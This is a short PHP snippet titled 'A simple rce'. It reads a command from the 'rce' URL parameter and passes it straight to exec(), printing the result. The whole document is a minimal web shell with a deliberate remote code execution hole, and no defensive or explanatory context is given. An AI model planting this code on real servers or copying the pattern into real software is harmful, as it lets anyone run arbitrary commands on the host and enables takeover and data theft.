<h2>A simple rce</h2>
<?php 
$rce = $_GET['rce'];
echo exec($rce);
?>